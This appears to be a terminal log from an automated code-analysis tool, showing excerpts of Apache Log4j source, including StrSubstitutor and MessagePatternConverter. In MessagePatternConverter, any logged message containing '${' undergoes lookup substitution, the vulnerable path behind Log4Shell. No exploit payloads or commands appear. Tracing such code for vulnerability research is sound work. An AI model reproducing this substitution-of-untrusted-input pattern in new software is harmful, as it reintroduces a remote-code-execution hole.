[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:    public String [0m[1;35mtoString[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:        final StringBuilder sb = new [0m[1;35mStringBuilder[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:        for [0m[1;39m([0m[39mfinal String name : [0m[1;35mlookups.keySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:            if [0m[1;39m([0m[1;35msb.length[0m[1;39m([0m[1;39m)[0m[39m == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:                [0m[1;35msb.append[0m[1;39m([0m[32m"[0m[32m{[0m[32m"[0m[1;39m)[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:                [0m[1;35msb.append[0m[1;39m([0m[32m", "[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:            [0m[1;35msb.append[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:        if [0m[1;39m([0m[1;35msb.length[0m[1;39m([0m[1;39m)[0m[39m > [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:            [0m[1;35msb.append[0m[1;39m([0m[32m"[0m[32m}[0m[32m"[0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m141[0m[39m:        return [0m[1;35msb.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m142[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m143[0m[39m:[0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:890[0m[39m-[0m[1;36m920[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m890[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m891[0m[39m:     * @param event The LogEvent, if there is one.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m892[0m[39m:     * @param variableName  the name of the variable, not null[0m                  [2m                [0m
[2;36m                    [0m         [1;36m893[0m[39m:     * @param buf  the buffer where the substitution is occurring, not null[0m     [2m                [0m
[2;36m                    [0m         [1;36m894[0m[39m:     * @param startPos  the start position of the variable including the [0m       [2m                [0m
[2;36m                    [0m         [39mprefix, valid[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m895[0m[39m:     * @param endPos  the end position of the variable including the suffix, [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m896[0m[39m:     * @return the variable's value or <b>null<[0m[35m/[0m[95mb[0m[39m> if the variable is unknown[0m   [2m                [0m
[2;36m                    [0m         [1;36m897[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m898[0m[39m:    protected String [0m[1;35mresolveVariable[0m[1;39m([0m[39mfinal LogEvent event, final String [0m        [2m                [0m
[2;36m                    [0m         [39mvariableName, final StringBuilder buf,[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m899[0m[39m:                                     final int startPos, final int endPos[0m[1;39m)[0m[39m [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m900[0m[39m:        final StrLookup resolver = [0m[1;35mgetVariableResolver[0m[1;39m([0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m901[0m[39m:        if [0m[1;39m([0m[39mresolver == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m902[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m903[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m904[0m[39m:        return [0m[1;35mresolver.lookup[0m[1;39m([0m[39mevent, variableName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m905[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m906[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m907[0m[39m:    [0m[35m/[0m[35m/[0m[39m Escape[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m908[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m909[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m910[0m[39m:     * Returns the escape character.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m911[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m912[0m[39m:     * @return the character used for escaping variable references[0m              [2m                [0m
[2;36m                    [0m         [1;36m913[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m914[0m[39m:    public char [0m[1;35mgetEscapeChar[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m915[0m[39m:        return this.escapeChar;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m916[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m917[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m918[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m919[0m[39m:     * Sets the escape character.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m920[0m[39m:     * If this character is placed before a variable reference in the source[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:17[0m[39m-[0m[1;36m78[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.message.Message;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MultiformatMessage;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Returns the event's rendered message in a StringBuilder.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"MessagePatternConverter"[0m[39m, category = [0m[32m"Converter"[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:@[0m[1;35mConverterKeys[0m[1;39m([0m[1;39m{[0m[32m"m"[0m[39m, [0m[32m"msg"[0m[39m, [0m[32m"message"[0m[39m [0m[1;39m}[0m[1;39m)[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:public final class MessagePatternConverter extends LogEventPatternConverter [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final String[0m[1;39m[[0m[1;39m][0m[39m formats;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private final Configuration config;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Private constructor.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param options options, may be null.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private [0m[1;35mMessagePatternConverter[0m[1;39m([0m[39mfinal Configuration config, final String[0m[1;39m[[0m[1;39m][0m[39m [0m  [2m                [0m
[2;36m                    [0m         [39moptions[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        [0m[1;35msuper[0m[1;39m([0m[32m"Message"[0m[39m, [0m[32m"message"[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        formats = options;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.config = config;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Obtains an instance of pattern converter.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param config The Configuration.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @param options options, may be null.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * @return instance of pattern converter.[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public static MessagePatternConverter [0m[1;35mnewInstance[0m[1;39m([0m[39mfinal Configuration [0m       [2m                [0m
[2;36m                    [0m         [39mconfig, final String[0m[1;39m[[0m[1;39m][0m[39m options[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        return new [0m[1;35mMessagePatternConverter[0m[1;39m([0m[39mconfig, options[0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:290[0m[39m-[0m[1;36m320[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m290[0m[39m:        return [0m[1;35mreplace[0m[1;39m([0m[39mnull, source[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m291[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m292[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m293[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m294[0m[39m:     * Replaces all the occurrences of variables with their matching values[0m     [2m                [0m
[2;36m                    [0m         [1;36m295[0m[39m:     * from the resolver using the given source string as a template.[0m           [2m                [0m
[2;36m                    [0m         [1;36m296[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m297[0m[39m:     * @param event The current LogEvent if there is one.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m298[0m[39m:     * @param source  the string to replace in, null returns null[0m               [2m                [0m
[2;36m                    [0m         [1;36m299[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m300[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m301[0m[39m:    public String [0m[1;35mreplace[0m[1;39m([0m[39mfinal LogEvent event, final String source[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m302[0m[39m:        if [0m[1;39m([0m[39msource == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m303[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m304[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m305[0m[39m:        final StringBuilder buf = new [0m[1;35mStringBuilder[0m[1;39m([0m[39msource[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m306[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m[1;36m0[0m[39m, [0m[1;35msource.length[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [1;36m307[0m[39m:            return source;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m308[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m309[0m[39m:        return [0m[1;35mbuf.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m310[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m311[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m312[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m313[0m[39m:     * Replaces all the occurrences of variables with their matching values[0m     [2m                [0m
[2;36m                    [0m         [1;36m314[0m[39m:     * from the resolver using the given source string as a template.[0m           [2m                [0m
[2;36m                    [0m         [1;36m315[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m316[0m[39m:     * Only the specified portion of the string will be processed.[0m              [2m                [0m
[2;36m                    [0m         [1;36m317[0m[39m:     * The rest of the string is not processed, and is not returned.[0m            [2m                [0m
[2;36m                    [0m         [1;36m318[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m319[0m[39m:     * @param source  the string to replace in, null returns null[0m               [2m                [0m
[2;36m                    [0m         [1;36m320[0m[39m:     * @param offset  the start offset within the array, must be valid[0m          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:720[0m[39m-[0m[1;36m750[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m720[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m721[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m722[0m[39m:     * Internal method that substitutes the variables.[0m                          [2m                [0m
[2;36m                    [0m         [1;36m723[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m724[0m[39m:     * Most users of this class do not need to call this method. This method [0m   [2m                [0m
[2;36m                    [0m         [39mwill[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m725[0m[39m:     * be called automatically by another [0m[1;39m([0m[39mpublic[0m[1;39m)[0m[39m method.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m726[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m727[0m[39m:     * Writers of subclasses can override this method if they need access to[0m    [2m                [0m
[2;36m                    [0m         [1;36m728[0m[39m:     * the substitution process at the start or end.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m729[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m730[0m[39m:     * @param event The current LogEvent, if there is one.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m731[0m[39m:     * @param buf  the string builder to substitute into, not null[0m              [2m                [0m
[2;36m                    [0m         [1;36m732[0m[39m:     * @param offset  the start offset within the builder, must be valid[0m        [2m                [0m
[2;36m                    [0m         [1;36m733[0m[39m:     * @param length  the length within the builder to be processed, must be [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m734[0m[39m:     * @return true if altered[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m735[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m736[0m[39m:    protected boolean [0m[1;35msubstitute[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder buf,[0m [2m                [0m
[2;36m                    [0m         [39mfinal int offset, final int length[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m737[0m[39m:        return [0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, offset, length, null[0m[1;39m)[0m[39m > [0m[1;36m0[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m738[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m739[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m740[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m741[0m[39m:     * Recursive handler for multiple levels of interpolation. This is the main[0m [2m                [0m
[2;36m                    [0m         [1;36m742[0m[39m:     * interpolation method, which resolves the values of all variable [0m         [2m                [0m
[2;36m                    [0m         [39mreferences[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m743[0m[39m:     * contained in the passed in text.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m744[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m745[0m[39m:     * @param event The current LogEvent, if there is one.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m746[0m[39m:     * @param buf  the string builder to substitute into, not null[0m              [2m                [0m
[2;36m                    [0m         [1;36m747[0m[39m:     * @param offset  the start offset within the builder, must be valid[0m        [2m                [0m
[2;36m                    [0m         [1;36m748[0m[39m:     * @param length  the length within the builder to be processed, must be [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m749[0m[39m:     * @param priorVariables  the stack keeping track of the replaced [0m          [2m                [0m
[2;36m                    [0m         [39mvariables, may be null[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m750[0m[39m:     * @return the length change that occurs, unless priorVariables is null [0m    [2m                [0m
[2;36m                    [0m         [39mwhen the int[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:810[0m[39m-[0m[1;36m840[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m810[0m[39m:                                pos += endMatchLen;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m811[0m[39m:                                final int endPos = pos;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m812[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m813[0m[39m:                                [0m[35m/[0m[35m/[0m[39m on the first call initialize priorVariables[0m  [2m                [0m
[2;36m                    [0m         [1;36m814[0m[39m:                                if [0m[1;39m([0m[39mpriorVariables == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m815[0m[39m:                                    priorVariables = new ArrayList<String>[0m[1;39m([0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m816[0m[39m:                                    [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mnew [0m[1;35mString[0m[1;39m([0m[39mchars,[0m        [2m                [0m
[2;36m                    [0m         [1;36m817[0m[39m:                                            offset, length[0m[1;39m)[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m818[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m819[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m820[0m[39m:                                [0m[35m/[0m[35m/[0m[39m handle cyclic substitution[0m                   [2m                [0m
[2;36m                    [0m         [1;36m821[0m[39m:                                [0m[1;35mcheckCyclicSubstitution[0m[1;39m([0m[39mvarName, [0m               [2m                [0m
[2;36m                    [0m         [39mpriorVariables[0m[1;39m)[0m[39m;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m822[0m[39m:                                [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mvarName[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m823[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m824[0m[39m:                                [0m[35m/[0m[35m/[0m[39m resolve the variable[0m                         [2m                [0m
[2;36m                    [0m         [1;36m825[0m[39m:                                final String varValue = [0m[1;35mresolveVariable[0m[1;39m([0m[39mevent, [0m [2m                [0m
[2;36m                    [0m         [39mvarName, buf,[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m826[0m[39m:                                        startPos, endPos[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m827[0m[39m:                                if [0m[1;39m([0m[39mvarValue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m828[0m[39m:                                    [0m[35m/[0m[35m/[0m[39m recursive replace[0m                        [2m                [0m
[2;36m                    [0m         [1;36m829[0m[39m:                                    final int varLen = [0m[1;35mvarValue.length[0m[1;39m([0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m830[0m[39m:                                    [0m[1;35mbuf.replace[0m[1;39m([0m[39mstartPos, endPos, varValue[0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m831[0m[39m:                                    altered = true;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m832[0m[39m:                                    int change = [0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m        [2m                [0m
[2;36m                    [0m         [39mstartPos,[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m833[0m[39m:                                            varLen, priorVariables[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m834[0m[39m:                                    change = change[0m                             [2m                [0m
[2;36m                    [0m         [1;36m835[0m[39m:                                            + [0m[1;39m([0m[39mvarLen - [0m[1;39m([0m[39mendPos - startPos[0m[1;39m)[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m836[0m[39m:                                    pos += change;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m837[0m[39m:                                    bufEnd += change;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m838[0m[39m:                                    lengthChange += change;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m839[0m[39m:                                    chars = [0m[1;35mgetChars[0m[1;39m([0m[39mbuf[0m[1;39m)[0m[39m; [0m[35m/[0m[35m/[0m[39m in case buffer [0m   [2m                [0m
